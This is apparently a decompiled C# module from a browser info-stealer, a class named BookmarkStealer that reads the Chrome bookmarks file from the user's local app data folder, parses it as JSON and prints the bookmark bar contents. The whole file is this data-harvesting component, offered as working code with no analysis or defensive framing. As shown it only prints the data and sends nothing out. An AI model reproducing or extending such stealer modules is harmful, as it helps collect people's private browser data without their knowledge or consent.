using System;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;

namespace Modules
{
	// Token: 0x0200000D RID: 13
	public class BookmarkStealer
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002F24 File Offset: 0x00001124
		public void Run()
		{
			Console.WriteLine("[+] Executing Bookmarks...");
			object obj = JsonConvert.DeserializeObject(File.ReadAllText(Environment.GetEnvironmentVariable("localappdata") + "\\Google\\Chrome\\User Data" + "\\Default\\Bookmarks"));
			if (BookmarkStealer.<>o__0.<>p__2 == null)
			{
				BookmarkStealer.<>o__0.<>p__2 = CallSite<Action<CallSite, Type, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "WriteLine", null, typeof(BookmarkStealer), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Action<CallSite, Type, object> target = BookmarkStealer.<>o__0.<>p__2.Target;
			CallSite <>p__ = BookmarkStealer.<>o__0.<>p__2;
			Type typeFromHandle = typeof(Console);
			if (BookmarkStealer.<>o__0.<>p__1 == null)
			{
				BookmarkStealer.<>o__0.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "bookmark_bar", typeof(BookmarkStealer), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
			}
			Func<CallSite, object, object> target2 = BookmarkStealer.<>o__0.<>p__1.Target;
			CallSite <>p__2 = BookmarkStealer.<>o__0.<>p__1;
			if (BookmarkStealer.<>o__0.<>p__0 == null)
			{
				BookmarkStealer.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "roots", typeof(BookmarkStealer), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
			}
			target(<>p__, typeFromHandle, target2(<>p__2, BookmarkStealer.<>o__0.<>p__0.Target(BookmarkStealer.<>o__0.<>p__0, obj)));
		}
	}
}
